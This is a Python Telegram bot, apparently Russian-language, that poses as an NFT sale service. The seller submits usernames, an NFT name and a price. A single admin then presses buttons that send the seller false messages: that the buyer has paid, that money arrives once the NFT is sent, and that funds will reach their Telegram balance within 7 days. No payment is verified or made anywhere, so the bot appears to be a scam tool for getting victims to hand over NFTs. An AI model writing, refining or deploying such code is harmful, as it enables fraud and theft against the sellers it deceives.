import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8921066517
# ===============================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


class SellNFT(StatesGroup):
    seller_username = State()
    buyer_username = State()
    nft_name = State()
    price = State()
    confirm = State()


@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "<b>Заявка на продажу NFT</b>\n\n"
        "Отправь <b>свой юзернейм</b> (куда переводить деньги):\n"
        "Например: @username",
        parse_mode="HTML"
    )
    await state.set_state(SellNFT.seller_username)


@dp.message(SellNFT.seller_username)
async def process_seller_username(message: Message, state: FSMContext):
    await state.update_data(seller_username=message.text.strip())
    await message.answer(
        "Теперь напиши <b>юзернейм покупателя</b>:\n"
        "Например: @skaence",
        parse_mode="HTML"
    )
    await state.set_state(SellNFT.buyer_username)


@dp.message(SellNFT.buyer_username)
async def process_buyer_username(message: Message, state: FSMContext):
    await state.update_data(buyer_username=message.text.strip())
    await message.answer(
        "Теперь напиши <b>название NFT</b>:",
        parse_mode="HTML"
    )
    await state.set_state(SellNFT.nft_name)


@dp.message(SellNFT.nft_name)
async def process_nft_name(message: Message, state: FSMContext):
    await state.update_data(nft_name=message.text.strip())
    await message.answer(
        "Теперь укажи <b>цену</b> (например: 150 TON):",
        parse_mode="HTML"
    )
    await state.set_state(SellNFT.price)


@dp.message(SellNFT.price)
async def process_price(message: Message, state: FSMContext):
    await state.update_data(price=message.text.strip())
    data = await state.get_data()

    text = (
        f"<b>Проверь заявку:</b>\n\n"
        f"Твой юзернейм: <code>{data['seller_username']}</code>\n"
        f"Юзернейм покупателя: <code>{data['buyer_username']}</code>\n"
        f"Название NFT: <b>{data['nft_name']}</b>\n"
        f"Цена: <b>{data['price']}</b>\n\n"
        f"Всё верно?"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Отправить", callback_data="confirm_yes"),
            InlineKeyboardButton(text="❌ Отменить", callback_data="confirm_no")
        ]
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.set_state(SellNFT.confirm)


@dp.callback_query(SellNFT.confirm, F.data == "confirm_yes")
async def confirm_yes(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    seller = callback.from_user

    admin_text = (
        f"<b>Новая заявка на продажу NFT</b>\n\n"
        f"От: {seller.full_name} (@{seller.username or 'нет'})\n"
        f"ID продавца: <code>{seller.id}</code>\n\n"
        f"Юзернейм продавца: <code>{data['seller_username']}</code>\n"
        f"Юзернейм покупателя: <code>{data['buyer_username']}</code>\n"
        f"Название NFT: <b>{data['nft_name']}</b>\n"
        f"Цена: <b>{data['price']}</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Согласиться", callback_data=f"accept:{seller.id}"),
            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"reject:{seller.id}")
        ]
    ])

    await bot.send_message(ADMIN_ID, admin_text, reply_markup=kb, parse_mode="HTML")
    await callback.message.edit_text("✅ Заявка отправлена. Ожидай решения.")
    await state.clear()
    await callback.answer()


@dp.callback_query(SellNFT.confirm, F.data == "confirm_no")
async def confirm_no(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Заявка отменена.")
    await state.clear()
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_deal(callback: CallbackQuery):
    seller_id = int(callback.data.split(":")[1])

    # Сообщение продавцу
    await bot.send_message(
        seller_id,
        "Покупатель оплатил заказ.\n\n"
        "После отправки NFT вы получите деньги."
    )

    # Кнопка "Подтвердить оплату" для админа
    new_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay:{seller_id}")]
    ])

    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>Ты согласился</b>\n\nНажми кнопку ниже, когда будешь готов подтвердить оплату:",
        reply_markup=new_kb,
        parse_mode="HTML"
    )
    await callback.answer("Продавцу отправлено уведомление")


@dp.callback_query(F.data.startswith("confirm_pay:"))
async def confirm_payment(callback: CallbackQuery):
    seller_id = int(callback.data.split(":")[1])

    # Финальное сообщение продавцу
    await bot.send_message(
        seller_id,
        "Деньги будут пополнены на баланс Telegram в течение 7 дней."
    )

    await callback.message.edit_text(
        callback.message.text + "\n\n💰 <b>Оплата подтверждена</b>",
        parse_mode="HTML"
    )
    await callback.answer("Продавцу отправлено финальное уведомление")


@dp.callback_query(F.data.startswith("reject:"))
async def reject_deal(callback: CallbackQuery):
    seller_id = int(callback.data.split(":")[1])

    await bot.send_message(
        seller_id,
        "К сожалению, покупатель отказался от вашей заявки."
    )

    await callback.message.edit_text(
        callback.message.text + "\n\n❌ <b>Ты отказался</b>",
        parse_mode="HTML"
    )
    await callback.answer("Продавцу отправлено уведомление об отказе")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
